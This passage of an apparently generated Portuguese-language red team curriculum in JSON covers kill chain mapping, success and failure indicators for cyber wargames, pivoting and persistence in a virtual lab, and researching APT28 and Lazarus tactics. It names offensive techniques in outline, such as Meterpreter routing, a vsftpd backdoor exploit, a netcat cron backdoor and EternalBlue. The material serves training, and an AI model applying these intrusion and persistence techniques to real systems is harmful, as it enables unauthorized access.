                                  "verification": "Produzir um documento de adaptação comparando Kill Chain original vs. Red Team.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Guia de Red Team Operations (ex: MITRE Cobalt Strike docs)",
                                    "Template de RoE",
                                    "Ferramenta de edição como Google Docs"
                                  ],
                                  "tips": "Sempre priorize ética: inclua 'kill switches' em fases como Instalação e C2.",
                                  "learningObjective": "Personalizar o Kill Chain para cenários controlados de Red Teaming.",
                                  "commonMistakes": [
                                    "Não considerar detecção precoce por Blue Team",
                                    "Sobrecarregar fases com atividades off-limits",
                                    "Ignorar feedback loops"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar Atividades e Táticas por Fase",
                                  "subSteps": [
                                    "Para cada fase, liste 3-5 táticas Red Team específicas (ex: OSINT tools no Recon).",
                                    "Especifique ferramentas (Nmap, Metasploit, etc.) e comandos iniciais.",
                                    "Defina indicadores de comprometimento (IoCs) por fase.",
                                    "Crie cenários ramificados para falhas em fases anteriores.",
                                    "Integre detecção de evasão em todas as fases."
                                  ],
                                  "verification": "Gerar uma matriz de fases x táticas com ferramentas e IoCs.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas: Shodan, Maltego, Cobalt Strike",
                                    "Lista de ferramentas Red Team",
                                    "Planilha Excel/Google Sheets"
                                  ],
                                  "tips": "Use TTPs do MITRE ATT&CK para enriquecer táticas e evitar abordagens genéricas.",
                                  "learningObjective": "Associar atividades acionáveis e ferramentas a cada fase adaptada.",
                                  "commonMistakes": [
                                    "Listar táticas irrelevantes ou desatualizadas",
                                    "Não mapear ferramentas a fases específicas",
                                    "Esquecer evasão de detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estruturar e Visualizar o Cenário Sequencial",
                                  "subSteps": [
                                    "Crie um fluxograma mostrando fluxo linear e loops entre fases.",
                                    "Adicione milestones e pontos de decisão (ex: pivotar após Exploração).",
                                    "Inclua timelines estimadas por fase para o cenário completo.",
                                    "Teste o fluxograma simulando um walkthrough verbal.",
                                    "Exporte em formato compartilhável."
                                  ],
                                  "verification": "Produzir e apresentar um fluxograma interativo ou imagem do Kill Chain mapeado.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Draw.io ou Lucidchart",
                                    "Templates de Kill Chain",
                                    "Ferramentas de apresentação como PowerPoint"
                                  ],
                                  "tips": "Use cores para diferenciar fases e setas tracejadas para loops opcionais.",
                                  "learningObjective": "Representar visualmente o Kill Chain adaptado para planejamento claro.",
                                  "commonMistakes": [
                                    "Fluxogramas lineares sem ramificações",
                                    "Sobrecarga visual com excesso de texto",
                                    "Ignorar timelines"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Refinar o Mapeamento",
                                  "subSteps": [
                                    "Revise contra cenários reais de breaches (ex: SolarWinds).",
                                    "Simule gaps: identifique fraquezas em cada fase para Blue Team.",
                                    "Colete feedback simulado de pares ou mentor.",
                                    "Ajuste baseado em lições aprendidas de ops passadas.",
                                    "Documente versão final com changelog."
                                  ],
                                  "verification": "Realizar auto-revisão com checklist e gerar relatório de validação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Relatórios de incidentes (ex: Verizon DBIR)",
                                    "Checklist de validação",
                                    "Ferramenta de versionamento como Git"
                                  ],
                                  "tips": "Pergunte: 'O que falharia se Blue Team fosse proativo?' para refinar.",
                                  "learningObjective": "Garantir robustez e realismo no mapeamento do Kill Chain.",
                                  "commonMistakes": [
                                    "Validação superficial sem referências reais",
                                    "Não iterar após feedback",
                                    "Ignorar perspectivas defensivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário Red Team contra uma empresa fictícia 'TechCorp': Recon - OSINT via LinkedIn e Shodan para mapear funcionários e portas; Armamento - Criar spear-phish com payload Metasploit; Entrega - Email via SMTP spoofing; Exploração - Exploit EternalBlue; Instalação - Beacon C2; C2 - Comunicação via DNS tunneling; Ações - Exfiltração de dados simulada com validação RoE.",
                              "finalVerifications": [
                                "Lista precisa das 7 fases com definições adaptadas.",
                                "Matriz de táticas/ferramentas completa por fase.",
                                "Fluxograma sequencial funcional com ramificações.",
                                "Relatório de validação com referências a casos reais.",
                                "Timeline total do cenário plausível (ex: 7-14 dias).",
                                "Inclusão de RoE e kill switches em todas as fases."
                              ],
                              "assessmentCriteria": [
                                "Precisão e fidelidade ao modelo original (90%+ match).",
                                "Adequação às ops Red Team éticas e controladas.",
                                "Detalhamento acionável de sub-atividades e ferramentas.",
                                "Qualidade visual e clareza do fluxograma.",
                                "Profundidade na validação com exemplos reais.",
                                "Completude de todos os elementos (IoCs, timelines, evasão)."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças (SC-01): OSINT no Recon.",
                                "Engenharia Social (SC-04): Entrega via phishing.",
                                "Análise de Malware (SC-03): Armamento e Exploração.",
                                "Defesa em Camadas (SC-07): Gaps identificados na validação.",
                                "Simulações e Exercícios (SC-06): Aplicação full em jogos de guerra."
                              ],
                              "realWorldApplication": "Em operações Red Team profissionais, como pentests autorizados, o mapeamento do Kill Chain guia o planejamento de ataques simulados, permitindo que equipes Blue preparem defesas proativas, medir eficácia de detecções e cumprir regulamentações como NIST 800-53."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.2",
                            "name": "Definir Indicadores de Sucesso e Falha",
                            "description": "Estabelecer métricas e indicadores de compromisso (IoCs) para cada fase, permitindo avaliação em tempo real durante jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o Contexto e Objetivos da Fase",
                                  "subSteps": [
                                    "Revisar a descrição da fase no planejamento do jogo de guerra cibernética.",
                                    "Identificar os objetivos principais de ataque e defesa para essa fase específica.",
                                    "Mapear os atores envolvidos (equipe vermelha, azul, etc.) e seus papéis.",
                                    "Listar os recursos e assets críticos afetados pela fase.",
                                    "Documentar restrições temporais e ambientais da fase."
                                  ],
                                  "verification": "Criar um mapa mental ou tabela resumindo contexto, objetivos e atores, revisado por pares.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação do cenário, papel/caneta ou ferramenta de mind mapping (ex: Miro, Lucidchart).",
                                  "tips": "Use perguntas como 'O que define o início e fim dessa fase?' para guiar a análise.",
                                  "learningObjective": "Compreender integralmente o escopo da fase para alinhar indicadores.",
                                  "commonMistakes": "Ignorar interdependências com fases anteriores ou posteriores."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Indicadores de Sucesso (IoS)",
                                  "subSteps": [
                                    "Brainstorm métricas quantificáveis (ex: número de sistemas comprometidos, tempo para detecção).",
                                    "Estabelecer thresholds claros (ex: >80% de hosts infectados = sucesso).",
                                    "Priorizar indicadores observáveis em tempo real (logs, alertas, dashboards).",
                                    "Garantir alinhamento com objetivos estratégicos da fase.",
                                    "Escrever descrições SMART (Specific, Measurable, Achievable, Relevant, Time-bound) para cada IoS."
                                  ],
                                  "verification": "Lista de 5-10 IoS com thresholds e métodos de medição, aprovada por facilitador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Planilha Excel/Google Sheets para tabela de IoS, exemplos de cenários passados.",
                                  "tips": "Comece com verbos de ação: 'Detectar', 'Comprometer', 'Neutralizar'.",
                                  "learningObjective": "Criar métricas precisas que confirmem conquista de objetivos ofensivos/defensivos.",
                                  "commonMistakes": "Definir métricas vagas como 'bom desempenho' sem números."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Indicadores de Falha (IoF)",
                                  "subSteps": [
                                    "Identificar cenários opostos aos de sucesso (ex: detecção precoce, falha na escalada).",
                                    "Estabelecer thresholds de falha (ex: <20% de penetração = falha crítica).",
                                    "Incluir indicadores de risco emergente (ex: aumento anormal de tráfego).",
                                    "Balancear IoF com IoS para cobertura completa da fase.",
                                    "Testar logicamente: 'Se IoF ocorrer, o que impede o sucesso?'."
                                  ],
                                  "verification": "Tabela comparativa IoS vs IoF com pelo menos 5 pares, simulada em whiteboard.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramentas de diagramação (Draw.io), histórico de lições aprendidas de exercícios anteriores.",
                                  "tips": "Pense em 'early warning signs' para detecção proativa de falhas.",
                                  "learningObjective": "Desenvolver sensibilidade para riscos que sabotam a fase.",
                                  "commonMistakes": "Focar apenas em falhas catastróficas, ignorando parciais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Mecanismos de Monitoramento e Avaliação em Tempo Real",
                                  "subSteps": [
                                    "Selecionar ferramentas de monitoramento (SIEM, ELK Stack, scripts personalizados).",
                                    "Definir frequência de checagem (ex: a cada 5 min durante fase ativa).",
                                    "Criar dashboard ou relatório automatizado para visualização de IoS/IoF.",
                                    "Planejar triggers de ação (ex: alerta se IoF atingido).",
                                    "Simular monitoramento com dados mock para validar setup."
                                  ],
                                  "verification": "Protótipo de dashboard funcional com dados de teste, demo ao time.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramentas SIEM (Splunk free, Kibana), dados de log simulados.",
                                  "tips": "Integre com canais de comunicação (Slack/Teams) para notificações instantâneas.",
                                  "learningObjective": "Implementar avaliação dinâmica para ajustes em tempo real.",
                                  "commonMistakes": "Sobrecarregar com muitos indicadores, causando ruído em alertas."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra simulando ransomware em uma rede corporativa (fase de propagação): IoS = '80% dos endpoints infectados em 30 min'; IoF = 'Detecção por EDR em <10 min'; Monitorado via Kibana dashboard rastreando chamadas SMB maliciosas.",
                              "finalVerifications": [
                                "Todos IoS/IoF são quantificáveis e mensuráveis.",
                                "Cobertura completa de cenários de sucesso e falha por fase.",
                                "Mecanismos de monitoramento testados com dados simulados.",
                                "Documentação clara com thresholds e triggers.",
                                "Revisão por pares confirma ausência de ambiguidades.",
                                "Simulação end-to-end demonstra avaliação em tempo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão e relevância dos indicadores ao contexto da fase (30%).",
                                "Quantidade e qualidade de sub-passos detalhados (20%).",
                                "Viabilidade de monitoramento em tempo real (20%).",
                                "Uso de thresholds SMART e balanceamento IoS/IoF (15%).",
                                "Integração de ferramentas e automação (10%).",
                                "Clareza na documentação e exemplos práticos (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Estatística e Análise de Dados: Definição de métricas e thresholds.",
                                "Gestão de Projetos: Alinhamento com objetivos SMART.",
                                "Inteligência Artificial: Uso de ML para detecção de IoC em logs.",
                                "Psicologia Organizacional: Indicadores comportamentais em equipes de defesa."
                              ],
                              "realWorldApplication": "Em operações de Red Team reais, como as conduzidas pela NSA ou empresas de pentest (ex: Mandiant), esses indicadores permitem pausar exercícios se falhas críticas ocorrerem, otimizando treinamento e minimizando riscos em ambientes de produção simulados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.3"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.3",
                            "name": "Simular Sequência com Ferramentas de Pivoting",
                            "description": "Planejar transições entre fases utilizando conceitos de ethical hacking, como pivoting e persistência, com referências a ferramentas e artigos científicos em ofensiva cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Pivoting e Persistência",
                                  "subSteps": [
                                    "Estude definições de pivoting (uso de máquina comprometida para acessar rede interna) e persistência (manter acesso pós-exploração).",
                                    "Revise artigos científicos como 'Pivoting Techniques in Penetration Testing' (SANS Institute) e 'Advanced Persistent Threats' (Mandiant Reports).",
                                    "Identifique tipos de pivoting: TCP, SOCKS4/5, HTTP.",
                                    "Analise diagramas de fluxo de pivoting em ethical hacking.",
                                    "Compare pivoting com tunneling (ex: SSH dynamic forwarding)."
                                  ],
                                  "verification": "Resuma em um diagrama os conceitos e cite 3 referências científicas corretamente.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigos: SANS Reading Room on Pivoting, Mandiant M-Trends Report",
                                    "Ferramentas: Browser para PDFs",
                                    "Notepad para anotações"
                                  ],
                                  "tips": "Use mind maps para visualizar fluxos de pivoting; foque em cenários éticos.",
                                  "learningObjective": "Dominar terminologia e princípios teóricos de pivoting e persistência em ofensiva cibernética ética.",
                                  "commonMistakes": [
                                    "Confundir pivoting com port forwarding simples",
                                    "Ignorar aspectos legais/éticos",
                                    "Não citar fontes acadêmicas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Simulação Controlado",
                                  "subSteps": [
                                    "Instale VMs: Kali Linux (atacante), Metasploitable (alvo inicial), outra VM interna (alvo pivotado).",
                                    "Configure rede: Use VirtualBox/VMware com NAT e Host-Only para simular firewall.",
                                    "Instale ferramentas: Metasploit, socat, chisel para pivoting.",
                                    "Teste conectividade básica entre VMs sem pivoting.",
                                    "Crie credenciais de teste e backdoors simulados."
                                  ],
                                  "verification": "Execute ping e nmap do atacante para alvo inicial; confirme isolamento do alvo pivotado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "Kali Linux ISO",
                                    "Metasploitable ISO",
                                    "Metasploit Framework"
                                  ],
                                  "tips": "Use snapshots de VM para reset rápido; documente IPs e portas.",
                                  "learningObjective": "Preparar um lab seguro para simulações de ethical hacking sem riscos reais.",
                                  "commonMistakes": [
                                    "Expor lab à internet",
                                    "Usar VMs sem isolamento de rede",
                                    "Pular testes de conectividade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Simulação de Pivoting Básico",
                                  "subSteps": [
                                    "Comprometa alvo inicial com exploit Metasploit (ex: vsftpd backdoor).",
                                    "Estabeleça pivoting TCP: msf > route add (via sessão Meterpreter).",
                                    "Teste acesso ao alvo pivotado: nmap -Pn via pivô.",
                                    "Experimente pivoting SOCKS: use Proxychains ou msf socks proxy.",
                                    "Registre logs de tráfego com Wireshark."
                                  ],
                                  "verification": "Acesse shell no alvo pivotado via pivô; capture screenshot de nmap bem-sucedido.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Metasploit",
                                    "Proxychains",
                                    "Wireshark",
                                    "Meterpreter payloads"
                                  ],
                                  "tips": "Inicie com pivoting local antes de avançado; monitore CPU para exploits pesados.",
                                  "learningObjective": "Aplicar ferramentas de pivoting para transições de fase em simulações.",
                                  "commonMistakes": [
                                    "Esquecer de estabilizar sessão Meterpreter",
                                    "Usar portas erradas no route add",
                                    "Não limpar sessões pós-teste"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Persistência e Planejar Sequências de Fases",
                                  "subSteps": [
                                    "Implante persistência: Meterpreter persistence script ou backdoor custom (ex: netcat cron).",
                                    "Planeje sequência: Fase1 (entrada) > Pivô > Persistência > Fase2 (escalada lateral).",
                                    "Simule multi-pivô: pivote para rede interna e persista em múltiplos hosts.",
                                    "Avalie detecção: Use ferramentas como Volatility para simular forensics.",
                                    "Documente plano em formato de ataque chain (MITRE ATT&CK mapping)."
                                  ],
                                  "verification": "Reacesso após reboot da VM; valide plano sequencial com diagrama.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Meterpreter scripts",
                                    "MITRE ATT&CK Navigator",
                                    "Draw.io para diagramas"
                                  ],
                                  "tips": "Mapeie a T1078 (Valid Accounts) do MITRE para persistência ética.",
                                  "learningObjective": "Planejar transições completas entre fases com pivoting e persistência sustentável.",
                                  "commonMistakes": [
                                    "Persistência frágil (não sobrevive reboot)",
                                    "Sequências sem fallback",
                                    "Ignorar detecção por AV/EDR"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar, Documentar e Refinar a Simulação",
                                  "subSteps": [
                                    "Analise logs: Tempo de pivô, taxa de sucesso, gargalos.",
                                    "Refina plano: Otimize com ferramentas alternativas (chisel vs socat).",
                                    "Escreva relatório: Inclua referências científicas e lições aprendidas.",
                                    "Teste cenários de falha: Firewall bloqueando pivô.",
                                    "Compartilhe em fórum ético (ex: Reddit r/netsecstudents)."
                                  ],
                                  "verification": "Produza relatório de 2 páginas com evidências e MITRE mappings.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "ELK Stack ou txt logs",
                                    "LaTeX/Word para relatório",
                                    "MITRE ATT&CK framework"
                                  ],
                                  "tips": "Use templates de relatórios pentest; foque em reprodutibilidade.",
                                  "learningObjective": "Transformar simulação em plano estratégico acionável e documentado.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem evidências",
                                    "Não mapear a frameworks como MITRE",
                                    "Omitir análise de falhas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com 3 VMs (Kali, Metasploitable, Windows Server interno), comprometa Metasploitable via exploit, pivote via Meterpreter route para escanear e acessar o Windows Server (porta 445 bloqueada externamente), implante persistência com scheduled task, simulando transição de reconnaissance para lateral movement em um jogo de guerra cibernético.",
                              "finalVerifications": [
                                "Explicar pivoting e persistência com exemplos de ferramentas.",
                                "Executar pivô bem-sucedido em lab com screenshot de shell pivotado.",
                                "Planejar sequência de 3 fases com diagrama e MITRE mappings.",
                                "Sobrevivência de persistência pós-reboot confirmada.",
                                "Relatório documenta análise com referências científicas.",
                                "Identificar e mitigar 2 erros comuns na simulação."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (80% acerto em quiz teórico).",
                                "Sucesso na execução prática (pivô e persistência funcionais).",
                                "Qualidade do planejamento sequencial (clareza e completude).",
                                "Uso ético e seguro de ferramentas (sem vazamentos).",
                                "Profundidade da documentação e análise.",
                                "Integração de referências acadêmicas relevantes."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de roteamento e tunneling (CCNA).",
                                "Programação: Scripts Python para automação de pivoting.",
                                "Ética e Direito: Regulamentações de ethical hacking (CEH).",
                                "Análise de Dados: Logs e forensics com ELK.",
                                "Estratégia Militar: Planejamento de operações (jogos de guerra)."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante pentests corporativos, simular pivoting permite testar defesas internas, identificar caminhos de propagação de malware em redes segmentadas, e treinar Blue Teams para detecção de movimentos laterais em incident response."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.4",
                            "name": "Revisar e Iterar o Plano Sequencial",
                            "description": "Realizar revisões iterativas do plano com feedback de stakeholders, ajustando para realismo baseado em bibliografia como Hands-on Ethical Hacking.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a Revisão Inicial do Plano Sequencial",
                                  "subSteps": [
                                    "Reunir todos os stakeholders relevantes (equipe de segurança, analistas de ameaças, líderes de operações cibernéticas).",
                                    "Compilar o plano sequencial atual em um documento compartilhável com destaques das fases principais.",
                                    "Preparar uma lista de perguntas guiadas baseadas em critérios de realismo (ex.: viabilidade técnica, alinhamento com táticas reais de atacantes).",
                                    "Revisar bibliografia chave como 'Hands-on Ethical Hacking' para benchmarks de cenários realistas.",
                                    "Agendar sessão de feedback com agenda clara e ferramentas colaborativas (ex.: Miro, Microsoft Teams)."
                                  ],
                                  "verification": "Lista de participantes confirmados e documento de plano compartilhado com anotações preparatórias.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Plano sequencial atual (PDF/Doc)",
                                    "'Hands-on Ethical Hacking' (capítulos relevantes)",
                                    "Ferramentas colaborativas (Miro/Teams)",
                                    "Lista de perguntas guiadas"
                                  ],
                                  "tips": "Envie o plano com 48h de antecedência para leitura prévia, maximizando feedback qualitativo.",
                                  "learningObjective": "Entender como preparar uma revisão colaborativa para garantir input diversificado.",
                                  "commonMistakes": [
                                    "Não convidar stakeholders chave",
                                    "Falta de agenda estruturada",
                                    "Ignorar bibliografia pré-revisão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar e Documentar Feedback dos Stakeholders",
                                  "subSteps": [
                                    "Facilitar a sessão de feedback com rodadas estruturadas: forças, fraquezas, sugestões por fase sequencial.",
                                    "Registrar feedback em tempo real usando planilhas ou boards colaborativos, categorizando por fase do plano.",
                                    "Explorar exemplos reais de 'Hands-on Ethical Hacking' para validar sugestões de realismo.",
                                    "Priorizar feedback urgente (ex.: gaps em defesas cibernéticas ou táticas de evasão).",
                                    "Encerrar sessão resumindo pontos principais e atribuindo responsáveis para análise posterior."
                                  ],
                                  "verification": "Registro completo de feedback com categorias, timestamps e atribuições.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas colaborativas (Miro/Jamboard)",
                                    "Cópia digital do plano",
                                    "Referências de 'Hands-on Ethical Hacking'",
                                    "Planilha de feedback template"
                                  ],
                                  "tips": "Use timer para cada fase (10-15 min) para manter foco e evitar divagações.",
                                  "learningObjective": "Dominar técnicas de coleta de feedback iterativo em contextos de segurança cibernética.",
                                  "commonMistakes": [
                                    "Permitir discussões off-topic",
                                    "Não documentar verbalmente",
                                    "Ignorar feedback minoritário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Feedback e Planejar Ajustes",
                                  "subSteps": [
                                    "Classificar feedback: crítico (realismo/segurança), moderado (otimização), cosmético.",
                                    "Mapear feedback para fases sequenciais específicas, cruzando com bibliografia para validação.",
                                    "Identificar padrões e conflitos, consultando 'Hands-on Ethical Hacking' para precedentes reais.",
                                    "Priorizar ajustes usando matriz de impacto/esforço (alto impacto/baixo esforço primeiro).",
                                    "Rascunhar plano de iteração com mudanças propostas e métricas de sucesso."
                                  ],
                                  "verification": "Matriz de análise de feedback preenchida e rascunho de ajustes aprovado internamente.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Planilha de análise (Excel/Google Sheets)",
                                    "'Hands-on Ethical Hacking' (seções de cenários)",
                                    "Matriz impacto/esforço template"
                                  ],
                                  "tips": "Quantifique feedback onde possível (ex.: 'reduzir tempo de fase X em 20%') para objetividade.",
                                  "learningObjective": "Aprender a analisar feedback de forma sistemática para planos cibernéticos realistas.",
                                  "commonMistakes": [
                                    "Sobrecarregar com ajustes triviais",
                                    "Não validar com bibliografia",
                                    "Ignorar trade-offs de segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Iterações e Validar o Plano Atualizado",
                                  "subSteps": [
                                    "Aplicar ajustes priorizados ao plano sequencial, atualizando timelines, recursos e contingências.",
                                    "Simular brevemente as mudanças alteradas usando ferramentas como MITRE ATT&CK para realismo.",
                                    "Compartilhar versão iterada com stakeholders para aprovação rápida.",
                                    "Documentar todas as mudanças em um log de iterações, incluindo justificativas baseadas em feedback/bibliografia.",
                                    "Realizar verificação final de coerência sequencial e realismo geral."
                                  ],
                                  "verification": "Plano atualizado versionado, log de mudanças completo e aprovação de pelo menos 80% dos stakeholders.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de documentos (Google Docs)",
                                    "MITRE ATT&CK Navigator",
                                    "'Hands-on Ethical Hacking'",
                                    "Log de iterações template"
                                  ],
                                  "tips": "Versão o plano (ex.: v1.1) para rastreabilidade e use diff tools para destacar mudanças.",
                                  "learningObjective": "Executar iterações eficazes que elevem o realismo de planos de operações cibernéticas.",
                                  "commonMistakes": [
                                    "Mudanças sem documentação",
                                    "Não testar simulações",
                                    "Aprovação sem consenso mínimo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team para simular um APT contra uma rede corporativa, stakeholders (defensores azuis e gerentes) identificam que a fase de 'persistência' ignora detecções EDR reais. Feedback leva a iteração: adicionar táticas de living-off-the-land do 'Hands-on Ethical Hacking', reduzindo tempo de fase de 48h para 24h com verificações de evasão.",
                              "finalVerifications": [
                                "Plano iterado reflete 100% do feedback crítico.",
                                "Alinhamento verificado com benchmarks de 'Hands-on Ethical Hacking'.",
                                "Aprovação documentada de stakeholders chave.",
                                "Log de iterações completo com justificativas.",
                                "Simulação rápida confirma realismo sequencial.",
                                "Métricas de sucesso definidas para próxima iteração."
                              ],
                              "assessmentCriteria": [
                                "Profundidade da análise de feedback (cobertura de todas as fases).",
                                "Integração precisa de bibliografia para realismo.",
                                "Eficiência das iterações (redução de gaps sem adicionar complexidade desnecessária).",
                                "Qualidade da documentação e versionamento.",
                                "Consenso stakeholder medido por taxa de aprovação.",
                                "Coerência sequencial pós-iteração."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos (iterações ágeis como Scrum retrospectives).",
                                "Comunicação e Liderança (facilitação de sessões colaborativas).",
                                "Análise de Dados (classificação e priorização de feedback).",
                                "Ética e Governança (garantir realismo sem riscos reais)."
                              ],
                              "realWorldApplication": "Em equipes de SOC ou Red Teams de empresas como Google ou bancos, revisar planos sequenciais iterativamente previne falhas em wargames cibernéticos, alinhando com exercícios reais como Cyber Storm do DHS, otimizando defesas contra ameaças persistentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.3",
                    "name": "Construção de Narrativas Realistas",
                    "description": "Criação de histórias de ataque baseadas em táticas reais de adversários, como mindset e indicadores de compromisso.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.3.1",
                        "name": "Mindset do Adversário",
                        "description": "Compreender a mentalidade e as motivações dos adversários cibernéticos reais, como grupos APT (Advanced Persistent Threats), para fundamentar narrativas autênticas em operações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.1.1",
                            "name": "Pesquisar Táticas de Adversários Reais",
                            "description": "Analisar relatórios públicos de incidentes cibernéticos (ex: MITRE ATT&CK) para identificar padrões de comportamento de atacantes como APT28 ou Lazarus Group, focando em fases como reconnaissance e initial access.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Acessar Fontes Confiáveis de Inteligência de Ameaças",
                                  "subSteps": [
                                    "Pesquise repositórios públicos como MITRE ATT&CK Navigator e selecione grupos de adversários como APT28 (Fancy Bear) e Lazarus Group (APT38).",
                                    "Acesse páginas específicas de grupos no MITRE ATT&CK (ex: G0007 para APT28, G0032 para Lazarus).",
                                    "Revise a estrutura geral do framework ATT&CK, focando nas fases de Reconnaissance (TA0043) e Initial Access (TA0001).",
                                    "Anote metadados iniciais como aliases, países de origem e incidentes associados."
                                  ],
                                  "verification": "Lista de 3+ fontes acessadas com URLs e resumo inicial de cada grupo.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "MITRE ATT&CK website (attack.mitre.org)",
                                    "Browser com acesso à internet",
                                    "Notebook ou ferramenta de notas (ex: Notion, Obsidian)"
                                  ],
                                  "tips": "Use o MITRE ATT&CK Navigator para visualizações interativas de TTPs.",
                                  "learningObjective": "Compreender a estrutura de frameworks de inteligência de ameaças e localizar perfis de APTs.",
                                  "commonMistakes": [
                                    "Confundir grupos (ex: APT28 com APT29)",
                                    "Ignorar fontes primárias em favor de blogs não verificados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Táticas em Fases de Reconnaissance",
                                  "subSteps": [
                                    "Liste todas as táticas sob Reconnaissance para o grupo selecionado (ex: T1595 Active Scanning para APT28).",
                                    "Para cada tática, identifique técnicas e sub-técnicas usadas em incidentes reais.",
                                    "Colete evidências de relatórios públicos, como citações de MITRE ou relatórios da Mandiant.",
                                    "Compare padrões entre APT28 e Lazarus, notando similaridades como uso de OSINT."
                                  ],
                                  "verification": "Tabela ou mapa com 5+ TTPs de reconnaissance, incluindo exemplos de uso.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "MITRE ATT&CK Group pages",
                                    "Relatórios da Mandiant ou FireEye (disponíveis online)",
                                    "Ferramenta de mapeamento (ex: Draw.io ou Excel)"
                                  ],
                                  "tips": "Filtre por 'Procedures' para exemplos reais de incidentes.",
                                  "learningObjective": "Mapear TTPs específicas de reconnaissance de APTs reais.",
                                  "commonMistakes": [
                                    "Focar apenas em táticas genéricas sem exemplos de incidentes",
                                    "Sobrecarregar com TTPs de todas as fases"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Táticas em Fases de Initial Access",
                                  "subSteps": [
                                    "Examine táticas de Initial Access (ex: T1566 Phishing para ambos os grupos).",
                                    "Detalhe técnicas como Spearphishing Attachment (T1566.001) usado pelo Lazarus no ataque ao Bangladesh Bank.",
                                    "Identifique vetores comuns, como malware delivery via watering holes para APT28.",
                                    "Documente mitigações sugeridas no ATT&CK para cada TTP."
                                  ],
                                  "verification": "Relatório com 4+ TTPs de initial access, evidências e mitigações.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "MITRE ATT&CK Technique pages",
                                    "Relatórios de incidentes (ex: Sony Hack para Lazarus)",
                                    "PDF reader para relatórios"
                                  ],
                                  "tips": "Busque por 'Examples' nas páginas de técnicas para casos reais.",
                                  "learningObjective": "Identificar padrões de initial access e suas implicações defensivas.",
                                  "commonMistakes": [
                                    "Ignorar variações regionais (ex: Lazarus foca em crypto theft)",
                                    "Confundir correlação com causalidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Padrões e Criar Perfil do Adversário",
                                  "subSteps": [
                                    "Sintetize padrões comuns (ex: ambos usam phishing customizado e scanning passivo).",
                                    "Crie um perfil narrativo: motivações, persistência e evolução de TTPs.",
                                    "Identifique gaps no conhecimento público e sugestões para pesquisa adicional.",
                                    "Valide achados cruzando com fontes secundárias como relatórios da CISA."
                                  ],
